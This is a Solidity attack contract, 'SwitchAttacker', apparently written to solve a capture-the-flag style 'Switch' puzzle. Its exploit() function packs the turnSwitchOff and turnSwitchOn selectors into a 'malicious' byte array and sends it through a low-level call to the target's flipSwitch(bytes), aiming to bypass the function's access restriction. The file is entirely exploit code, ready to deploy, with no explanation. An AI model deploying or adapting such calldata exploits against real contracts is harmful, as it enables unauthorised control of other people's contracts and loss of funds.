// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Strings.sol";

contract SwitchAttacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function exploit() external {
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));

        // Create a malicious data array combining both selectors
        bytes memory maliciousData = abi.encodePacked(turnSwitchOffSelector, turnSwitchOnSelector);

        // Call the flipSwitch function on the target contract
        (bool success, ) = target.call(abi.encodeWithSignature("flipSwitch(bytes)", maliciousData));

        require(success, "Exploit failed");
    }
}
